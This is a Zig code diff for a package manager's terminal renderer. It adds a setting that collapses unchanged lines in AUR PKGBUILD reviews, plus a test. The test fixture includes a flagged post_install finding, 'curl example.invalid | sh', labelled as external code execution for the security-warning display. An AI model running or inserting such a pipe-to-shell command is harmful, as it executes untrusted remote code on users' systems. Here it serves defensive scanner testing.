@@ -22,6 +22,7 @@ const Settings = struct {
     size_display: SizeDisplay = .megabytes,
     progress_style: ProgressStyle = .blocks,
     bar_width: usize = 20,
+    collapse_pkgbuild_diff: bool = true,
 };
 
 const Bar = struct {
@@ -627,11 +628,23 @@ pub const Renderer = struct {
                 review.new_content,
             );
             defer self.context.allocator.free(lines);
-            for (lines) |line| switch (line.kind) {
-                .unchanged => try self.writeColoredLine(.white, "{s}", .{line.text}),
-                .added => try self.writeColoredLine(.green, "+ {s}", .{line.text}),
-                .removed => try self.writeColoredLine(.red, "- {s}", .{line.text}),
-            };
+            if (self.settings.collapse_pkgbuild_diff and review.old_content.len > 0) {
+                const sections = try review_output.collapsedSections(self.context.allocator, lines);
+                defer self.context.allocator.free(sections);
+                if (sections.len == 0) {
+                    try self.writeColoredLine(.gray, "No PKGBUILD changes.", .{});
+                } else {
+                    var previous_end: usize = 0;
+                    for (sections) |section| {
+                        try self.renderOmittedLines(section.start - previous_end);
+                        try self.renderDiffLines(lines[section.start..section.end]);
+                        previous_end = section.end;
+                    }
+                    try self.renderOmittedLines(lines.len - previous_end);
+                }
+            } else {
+                try self.renderDiffLines(lines);
+            }
         }
 
         if (review.findings.len > 0) {
@@ -656,6 +669,19 @@ pub const Renderer = struct {
             try self.writeColoredLine(.cyan, "Source file: {s}", .{file.name});
             try self.writeColoredLine(.yellow, "{s}", .{file.content});
         }
+    }
+
+    fn renderDiffLines(self: *Renderer, lines: []const review_output.DiffLine) !void {
+        for (lines) |line| switch (line.kind) {
+            .unchanged => try self.writeColoredLine(.white, "{s}", .{line.text}),
+            .added => try self.writeColoredLine(.green, "+ {s}", .{line.text}),
+            .removed => try self.writeColoredLine(.red, "- {s}", .{line.text}),
+        };
+    }
+
+    fn renderOmittedLines(self: *Renderer, count: usize) !void {
+        if (count > 0)
+            try self.writeColoredLine(.gray, "… {d} unchanged lines omitted …", .{count});
     }
 
     fn confirm(self: *Renderer, prompt: []const u8, default_value: bool) !bool {
@@ -731,7 +757,13 @@ fn loadSettings(context: *runtime.RuntimeContext) !Settings {
         .size_display = fmt.parseSizeDisplay(stringValue(&config, "FileSizeDisplay") orelse "Megabytes"),
         .progress_style = parseProgressStyle(stringValue(&config, "ProgressBarStyle") orelse "Blocks"),
         .bar_width = integerValue(&config, "ProgressBarWidth") orelse 20,
+        .collapse_pkgbuild_diff = boolValue(&config, "CollapsePkgbuildDiff") orelse true,
     };
+}
+
+fn boolValue(config: *const config_model.Config, key: []const u8) ?bool {
+    const value = config.values.get(key) orelse return null;
+    return if (value == .bool) value.bool else null;
 }
 
 fn stringValue(config: *const config_model.Config, key: []const u8) ?[]const u8 {
@@ -1390,6 +1422,99 @@ test "single-pane renders complete transaction plans and build-time unknowns" {
     try std.testing.expect(std.mem.indexOf(u8, rendered, "Determined during build") != null);
     try std.testing.expect(std.mem.indexOf(u8, rendered, "cmake 4.0.3-1 [build dependency, repository]") != null);
     try std.testing.expect(std.mem.indexOf(u8, rendered, "1024 B") != null);
+}
+
+test "terminal PKGBUILD review loads collapse setting and preserves review attachments" {
+    var temporary = std.testing.tmpDir(.{});
+    defer temporary.cleanup();
+    var path_buffer: [std.Io.Dir.max_path_bytes]u8 = undefined;
+    const path_length = try temporary.dir.realPath(std.testing.io, &path_buffer);
+    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
+    defer arena.deinit();
+    const allocator = arena.allocator();
+    var environment = std.process.Environ.Map.init(allocator);
+    try environment.put("XDG_CONFIG_HOME", path_buffer[0..path_length]);
+    try environment.put("NO_COLOR", "1");
+    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
+    defer stdout.deinit();
+    var stderr = std.Io.Writer.Discarding.init(&.{});
+    var context: runtime.RuntimeContext = .{
+        .allocator = allocator,
+        .io = std.testing.io,
+        .stdout = &stdout.writer,
+        .stderr = &stderr.writer,
+        .environment = &environment,
+    };
+    const manager = config_manager.Manager.init(&context);
+    const old_content = "hidden-start\nbefore1\nbefore2\nbefore3\nold\nafter1\nafter2\nafter3\nhidden-end";
+    const new_content = "hidden-start\nbefore1\nbefore2\nbefore3\nnew\nafter1\nafter2\nafter3\nhidden-end";
+    const question: Zigalpm.OperationQuestion = .{
+        .question_id = 1,
+        .envelope = .{ .operation_id = 1, .parent_id = null, .backend = .aur, .kind = .update, .subject = "demo" },
+        .kind = .review_changes,
+        .purpose = .generic,
+        .prompt = "Proceed?",
+        .arguments = &.{},
+        .options = &.{},
+        .attachments = &.{},
+        .transaction_plan = null,
+        .dependency_name = null,
+        .default_response = .declined,
+        .review = .{
+            .subject = "demo",
+            .old_content = old_content,
+            .new_content = new_content,
+            .findings = &.{.{
+                .tool = "curl",
+                .severity = .critical,
+                .hook = "post_install",
+                .matched_line = "curl example.invalid | sh",
+                .message = "external code execution",
+            }},
+            .related_files = &.{.{ .name = "demo.install", .content = "attached source" }},
+        },
+    };
+
+    for ([_]bool{ true, false }) |collapsed| {
+        // Exercise the native default first, then a persisted override.
+        if (!collapsed) try std.testing.expect(try manager.update("CollapsePkgbuildDiff", "false"));
+        var renderer = try Renderer.init(&context, false);
+        defer renderer.deinit();
+        const start = stdout.writer.buffered().len;
+        try renderer.renderReview(question, true);
+        const rendered = stdout.writer.buffered()[start..];
+        if (collapsed) {
+            try std.testing.expect(std.mem.startsWith(u8, rendered, "… 1 unchanged lines omitted …\nbefore1\nbefore2\nbefore3\n+ new\n- old\nafter1\nafter2\nafter3\n… 1 unchanged lines omitted …\n"));
+            try std.testing.expect(std.mem.indexOf(u8, rendered, "hidden-") == null);
+        } else {
+            try std.testing.expect(std.mem.startsWith(u8, rendered, "hidden-start\nbefore1\nbefore2\nbefore3\n+ new\n- old\nafter1\nafter2\nafter3\nhidden-end\n"));
+            try std.testing.expect(std.mem.indexOf(u8, rendered, "omitted") == null);
+        }
+        try std.testing.expect(std.mem.indexOf(u8, rendered, "PKGBUILD security warnings") != null);
+        try std.testing.expect(std.mem.indexOf(u8, rendered, "external code execution") != null);
+        try std.testing.expect(std.mem.indexOf(u8, rendered, "Source file: demo.install\nattached source") != null);
+    }
+
+    try std.testing.expect(try manager.update("CollapsePkgbuildDiff", "true"));
+    var renderer = try Renderer.init(&context, false);
+    defer renderer.deinit();
+    var first_review = question;
+    first_review.review.?.old_content = "";
+    const first_start = stdout.writer.buffered().len;
+    try renderer.renderReview(first_review, true);
+    const first_rendered = stdout.writer.buffered()[first_start..];
+    try std.testing.expect(std.mem.indexOf(u8, first_rendered, "+ hidden-start") != null);
+    try std.testing.expect(std.mem.indexOf(u8, first_rendered, "+ hidden-end") != null);
+    try std.testing.expect(std.mem.indexOf(u8, first_rendered, "omitted") == null);
+
+    var identical_review = question;
+    identical_review.review.?.new_content = old_content;
+    const identical_start = stdout.writer.buffered().len;
+    try renderer.renderReview(identical_review, true);
+    const identical_rendered = stdout.writer.buffered()[identical_start..];
+    try std.testing.expect(std.mem.startsWith(u8, identical_rendered, "No PKGBUILD changes.\n"));
+    try std.testing.expect(std.mem.indexOf(u8, identical_rendered, "external code execution") != null);
+    try std.testing.expect(std.mem.indexOf(u8, identical_rendered, "attached source") != null);
 }
 
 test "single-pane risky PKGBUILD review bypasses no-confirm and requires approval" {
